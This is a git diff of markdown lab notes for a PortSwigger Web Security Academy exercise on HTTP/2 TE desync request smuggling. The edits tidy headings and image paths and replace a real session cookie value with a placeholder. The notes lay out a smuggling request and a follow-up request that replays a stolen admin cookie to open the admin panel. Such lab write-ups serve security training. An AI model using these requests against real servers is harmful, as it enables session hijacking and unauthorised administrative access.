@@ -632,7 +632,7 @@ search=nutty
   
 [Youtube demo HTTP/2 request smuggling via CRLF injection](https://youtu.be/E-bnCGzl7Rk)  
 
-## HTTP/2 TE desync v10a h2path
+### HTTP/2 TE desync v10a h2path
 
 >Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The burp request smuggling scanner will detect the HTTP/2 TE desync vulnerability.  
 
@@ -641,7 +641,7 @@ search=nutty
 >Note: enable the **Allow HTTP/2 ALPN override** option.  
 
 ```html
-POST / HTTP/2
+POST /x HTTP/2
 Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net
 Transfer-Encoding: chunked
 
@@ -657,23 +657,22 @@ Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net\r\n
 
 ![302 Response once stolen admin cookie request captured](images/302-stolen-admin-cookie.png)  
 
->copy stolen session cookie value into **http/2** GET request to the admin panel.  
+>Copy stolen session cookie value into new **http/2** GET request to the admin panel.  
 
 ```
 GET /admin HTTP/2
 Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net
-Cookie: session=7CS1F82tF89DmCEMRiLKjMUaqCU6NaXI
+Cookie: session=StolenAdminSessionCookieValue
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
 ```  
 
-![admin-panel-access](admin-panel-access.png)  
+![admin-panel-access](images/admin-panel-access.png)  
 
 [PortSwigger Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)  
-
-
+  
 
 # Privilege Escalation  
   
